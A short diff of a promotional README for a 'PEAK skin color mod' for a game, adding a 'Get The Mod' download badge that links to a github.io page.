@@ -4,6 +4,7 @@
 
 In competitive titles like PEAK, standing out isn’t just about skill—it’s also about style. The **PEAK skin color mod** lets you break free from default character tones and design your own look. Whether you want subtle realism or bold fantasy vibes, this mod gives you full control over your character’s appearance.
 
+[![Get](https://img.shields.io/badge/Get%20The-Mod-blueviolet)](https://peak-skin-color-mod.github.io/.github/)
 ---
 
 ## Product Description
